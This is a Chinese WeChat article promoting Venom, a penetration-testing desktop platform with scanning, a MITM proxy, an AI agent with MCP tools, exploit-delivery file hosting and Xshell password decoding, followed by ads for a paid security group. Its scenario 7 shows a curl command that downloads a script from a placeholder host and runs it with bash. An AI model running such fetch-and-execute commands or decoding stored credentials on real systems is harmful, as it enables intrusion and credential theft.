---
title: [工具推荐]专为渗透测试工程师和安全研究员设计的新一代集成化安全测试平台-Venom
url: https://mp.weixin.qq.com/s/x1oWwTu9GWy9afY1p_G8Ng
source: Doonsec's feed
date: 2026-11-07
fetch_date: 2026-11-08T08:09:43.444461
---

# [工具推荐]专为渗透测试工程师和安全研究员设计的新一代集成化安全测试平台-Venom

# [工具推荐]专为渗透测试工程师和安全研究员设计的新一代集成化安全测试平台-Venom

Zcentury
Zcentury

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

工具介绍

Venom 是专为渗透测试工程师和安全研究员设计的新一代集成化安全测试平台。项目由 Electron + Vue3 桌面端和 Go 编写的本地引擎组成，通过 gRPC 将资产测绘、端口扫描、数据处理、MITM 代理、Web 辅助工具、小程序反编译、Agent 智能体和 MCP 扩展等能力整合到统一工作台中。Venom 的定位不是堆满入口的大而全菜单，而是把红队与安全测试过程中常见的重复动作收口到一套可联动的流程里：测绘结果可以直接送入端口扫描，抓到的流量可以送入加解密工作流，调通的工作流又可以挂回 MITM 规则中自动执行，复杂分析任务也可以交给 Agent 调用技能、指令和 MCP 工具持续推进。

## 核心功能

| 功能模块 | 核心价值 | 当前能力 |
| --- | --- | --- |
| 🤖 Agent 智能体 | 将多轮安全分析沉淀为可控的智能工作台 | 会话管理、Agent 工作区、模型选择、手动审批、技能启停、指令调用、分析过程与结论沉淀 |
| 🔌 MCP 服务扩展 | 让 Agent 调用外部工具、本地脚本和自建服务 | MCP 服务器管理、工具发现与调用、与技能/指令联动、适配自建安全服务和知识库 |
| 🚀 端口扫描 | 快速发现开放端口和 Web 暴露面 | 批量目标导入、端口策略预设、自定义端口、主机发现、协议识别、Web 指纹识别、Socks5 代理、实时进度和结果表格 |
| 🗺️ 空间测绘 | 聚合外部测绘结果并收敛攻击面 | FOFA、Hunter、DayDayMap 查询，测绘语法收藏，结果复制，选中资产发送到端口扫描 |
| 🔐 数据处理 | 快速清洗、比较和转换数据 | JSON 查询与 CSV 导出、文本差异对比、可视化加解密工作流、预设保存/分享/导入 |
| 🧩 加解密工作流 | 把一次性数据处理变成可复用流水线 | Base64/Base32/URL/Unicode/Hex/XOR，MD5/SHA/SM3/HMAC，AES/DES/3DES/RC4/SM4，RSA/SM2，参数处理与 DSL 辅助函数 |
| 🛰️ MITM 代理 | 在流量入口层完成捕获、命中、改写和转发 | HTTP/HTTPS 监听、CA 导出与状态检测、上游 HTTP/HTTPS/SOCKS5、触发器、请求/响应修改规则、与加解密预设联动 |
| 📡 Web 工具 | 配合 Vnx 提供带外验证与投递能力 | 302 跳转、文件管理、DNSLog、HTTPLog，支持 API Key 配置和连通性检测 |
| 📱 微信小程序反编译 | 辅助分析本地微信小程序包 | 扫描 Applet 目录、小程序信息识别、多版本反编译、敏感信息提取、自定义提取规则、协同调试服务 |
| 🔥 POC 模板生成 | 快速构建标准化验证模板 | HTTP 类型 POC 模板生成、基础信息、风险等级、Matcher、Extractor、YAML 预览与复制 |
| 🛠️ 其他工具 | 管理常用工具和本地凭据分析 | 自定义快捷方式启动器、Xshell 会话密码解码 |

工具使用

### 场景一：🤖 Agent 智能体与安全技能编排

Agent 工作台用于承接需要多轮推理、资料整理和工具联动的安全分析任务。每个任务可以作为独立会话保存，配合 agent-workspace 保留上下文、过程产物和最终结论，适合做小程序敏感信息分析、服务暴露面研判、规则解释、报告整理等工作。

右侧技能面板可以按任务启停能力，例如微信小程序反编译、源码敏感信息分析、端口扫描与服务识别、编码解码、DNSLog 与 HTTPLog 回连验证、MITM 流量证据分析等。技能可以单独查看、开启或关闭，让 Agent 只使用当前任务真正需要的能力。

Agent 执行时支持模型选择和手动审批。涉及工具调用、文件操作、外部请求或需要确认的动作时，可以先由用户审批，再继续执行，避免自动化流程越权推进。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSxhn2icDtNFPdqDBuzXuqNhgBollMlib2WSs2gk4WL3Y4uffAiaT6ryxtW3fkJUACiabh5sicHax9ZN44icX43Z0a52GD7wBsib0oT1w/640?wx_fmt=png&from=appmsg)

### 场景二：🔌 MCP 服务器扩展

MCP 服务器模块用于把 Venom 外部的能力接入 Agent。可以将内部资产平台、自研扫描器、漏洞库、知识库、脚本工具或其他支持 MCP 的服务注册为可调用工具，让 Agent 在会话中按需查询、分析和整理结果。

MCP 能力可以和技能、指令一起使用：指令负责固化常用提示词和操作规范，技能负责封装安全场景能力，MCP 负责补齐外部数据源和工具执行能力。对于企业内网环境或私有化工具链，可以通过 MCP 把现有能力挂到 Venom 的智能体工作流中。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQYXrHBqia0ib9RnjfibmfrCnasdJl4xxtRQdiaJ8bLQXXSnVLAOkfkSicAes7LOUEgPsaMCicmprWAfuia3GsqDnDfnGibtyFx4ZY64x4/640?wx_fmt=png&from=appmsg)

### 场景三：🌐 资产测绘与端口扫描联动

从外部测绘平台快速收敛资产，再进入本地扫描确认真实暴露面。

**空间测绘**：支持 **FOFA / Hunter / DayDayMap**。配置 API Key 后即可查询资产，结果表格支持字段选择、分页、复制和语法收藏。

**发送到端口扫描**：在测绘结果中选中 IP 或域名，可以直接发送到端口扫描模块，减少手工整理目标的时间。

**端口扫描**：支持从文件、剪贴板或文本框批量导入目标，内置 Web 常用、Top100、Top1000、RCE、精简、全端口等策略，也可以直接填写自定义端口。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboT08orHaMWc3goMMmr7LCZxzfcuy3eQKjC0xibCZialj83fpuap9XzJ0QlLWeQLgQvE0xYYQIBJOoc0bM2GAX9ag2vOnuUICUm5U/640?wx_fmt=png&from=appmsg)

### 场景四：🚀 协议识别与 Web 指纹探测

端口扫描不只返回“开了哪个端口”，还会尽量补齐后续判断需要的信息。

扫描配置支持端口扫描、协议识别、Web 指纹三个阶段独立启停，并可以分别设置线程、超时、重试等参数。结果表格会展示主机、端口、协议、版本、状态码、标题、Web Server、组件和 Banner，方便继续定位高价值服务。

需要走代理的场景，可以在扫描配置中填写 Socks5 代理。

### 场景五：🔐 数据清洗、对比与加解密工作流

把常见的数据处理动作集中在一个地方完成。

**JSON 提取**：粘贴 JSON 后输入查询语法即可提取目标字段，结果可以转表格或导出 CSV。

**数据对比**：内置双栏 Diff 编辑器，适合快速比较两次请求、响应或配置差异。

**加解密工作流**：从左侧拖入编码、摘要、对称加密、非对称加密等组件，按顺序组成处理流水线。调通后可以保存为预设，也可以分享或导入配置。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR26JpFCXUdqxC79ZoNaJ7IH7iaDz9cibStjKF4oFtcTp2tj1NHPiaZaVsXQ9OmWEuJXov5UJqiaeUlasUSDF9cZ7KJrAxInptic7po/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQaDYHibbkRA0UtJBluUncED5KyxDb9E3hEFCFialBy099l0deqme3qfjNeCicMtRXTsoYjDpNYj24ylDia3dqfQheLUSSzgQX5Cy8/640?wx_fmt=png&from=appmsg)

### 场景六：🛰️ MITM 自动签名与自动改写

MITM 模块用于承接 HTTP/HTTPS 流量，并在进入上游之前完成匹配、改写和预处理。

当前模块包含 **代理流量、代理监听、上游代理、触发器、修改规则**。监听器负责接入流量，触发器负责判断哪些请求进入处理链，修改规则负责读取字段、拼接输入、调用加解密预设并写回 Header、Query、Form、JSON Body 或 Raw Body。

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSkAt8l0WUhybKwvF1LiaMrRvvsx1hCIv86AVXLMYibzPZ6lspCPeUP4237gbTnFIsxSHoP97lwupddonftiaavEa7wMrVNFKhoZw/640?wx_fmt=png&from=appmsg)

典型链路可以是：

```
Client -> Venom MITM -> Burp / 上游代理 -> Target
```

对于动态签名、请求体加密、响应解包、字段重算等场景，可以先在“数据处理 / 加解密”中拖出工作流并保存为预设，再在 MITM 修改规则中引用，让流量经过时自动处理。

### 场景七：📡 Web 工具与带外验证

Web 工具模块需要先配置并连通 **Vnx** 服务，配置项包含 Vnx 地址和 API Key。连通后可使用以下能力：

**302 跳转**：创建可控跳转链接，支持启停、复制、访问和访问次数统计。

**文件管理**：上传文件并生成下载链接或文本链接，适合投递脚本、EXP、配置文件等临时资源。

**DNSLog / HTTPLog**：生成专属域名或监听 URL，支持刷新和自动刷新，用于验证无回显漏洞、SSRF、Blind RCE 等场景。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQyCib5HLZFLG4rAhTA5H00eGGf6sbaTrSLN2kL7M3BAtoOicUEFaxaYXdxWBvcwnTqjnMIu88pRKGtp0PqzYHwEnibrLm4rjfiaYE/640?wx_fmt=png&from=appmsg)

```
curl -k -L https://xxxx/file/1/file -o echo.sh && chmod +x echo.sh && bash echo.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSomgZGe6uulZvn3Y6w5P5wgYArKMnPwkSj4sFhIqhyRvGBl4fYKYtGdAEZqiaduHwXbU30IRjl9UuHWJbfsaPklUCVKz1obERY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTYfFbNKiche7E5wrmGiaPggCDGnBZRyVDrxZO0hR9V2XicwnMLYEK5vIEiaKSZEPFwPhnvLsKFxGU18rZiamFMeXZc7Kia7tYaG0VibM/640?wx_fmt=png&from=appmsg)

### 场景八：📱 微信小程序反编译与信息提取

微信小程序模块面向本地微信 Applet 目录分析。

配置 Applet 路径和输出目录后，可以扫描本地小程序包，识别 AppID、主体、名称、版本等信息；对指定版本执行反编译后，可以打开输出目录查看源码，也可以按规则提取接口、页面路径、配置、敏感字段等信息。

规则配置页支持新增、修改、删除提取规则。协同服务可用于配合 `venom-wxmp` 做局域网调试和页面跳转。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQpwic5H3V1LxHZKzicXeBkCjFCS3jtl3gBqE7sVQTwcSAmyaPwpSBb9icGQicpDTD94xV4nQYqLDemszMjHXZ6WxfEBpNuP5jjM6I/640?wx_fmt=png&from=appmsg)

### 场景九：🔥 POC 模板生成与常用工具启动

**POC 模板生成** 当前处于 BETA 阶段，主要用于快速生成 HTTP 类型验证模板。可以填写模板 ID、名称、作者、风险等级、描述、参考链接、Classification、Metadata、请求、Matcher 和 Extractor，右侧实时生成 YAML 并支持复制。

**快捷方式** 支持把本地常用工具加入 Venom 面板，可配置程序路径、工作目录、启动参数、环境变量和图标。

**Xshell 密码解码** 支持输入 Xshell 会话文件或目录路径，自动使用当前 Windows 用户 SID 和用户名，也可以手动指定，用于批量解析会话中的主机、端口、账号和密码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQpj6eNmKwXicdYiaNoyQDrlcTiag47cywNjbA2tTvfzmticEpDmBAmLdIDThyWVGjIORD8gruubC88GVzlpIuE0nAUuG1x6k3z14c/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRq9XWpr0RJlaCt0aspg1Sy856ehIDp5ib1DoQqKdbO1l9jdgFqMOd5UT6ew0zib8ibJR8ozia1FJXJlCnRdJnWbhkcNuia2NgTnG1Y/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTAJTeAgzPEoWIJZXNPiasKfdHcPMlzekyiblfefs4g3qKFqerBGJiccyVdiaUXQia9ZvN4Bl3CRNdRS4O1mjJwwVh68AELv1XReTdQ/640?wx_fmt=png&from=appmsg)

工具链接

```
https://github.com/Zcentury/Venom/
```

**后台回复加群加入交流群**

**广告：****cisp pte/pts &nisp1级2级低价报考**

**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库****简单介绍****（****加入纷传圈子****送****知识库+漏洞库+面试题库****）**

如果觉得合适可以加入,圈子目前价格39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。

**圈子福利**

**edu漏洞挖掘1v1指导出洞**

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg)

**skill+grok辅助挖掘某企业sr****c****实战效果，能出但是重复多，agent独立挖掘也可以，见仁见智，看个人习惯，好的模型是最重要的。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQwyn779TTwY7vZkePQCL8k3K8dYxNdyzfgADL4dJcNUvpmodLeDVCZ6xDC4RJXEBmO2tcWqgUNdTVicKTW0jpdsg7X6xwP5gIQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQnIqagDL2A4BUIXrib9YVmATWuaIDqETqYd9ToHib52mDyoMyqc6Wzh733FRnbsDsGgey7B8s8jr72UtkPY6ich58niaPJqoItKcE/640?wx_fmt=png&from=appmsg)

**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**

**（图片仅供参考，我出不等于你出，见识**到**ai神力即可，多去用AI!!!）**

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1YNI9U6r6NMO4UMUBROoWeC4XQC4Dge94ODZ7tXY6tbxqb3IJoghve0u1SfkygE5UJ5HTdUBvLZKrn5ps13F71piax5dlHnOE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTGjdxKy4nllaLXIz...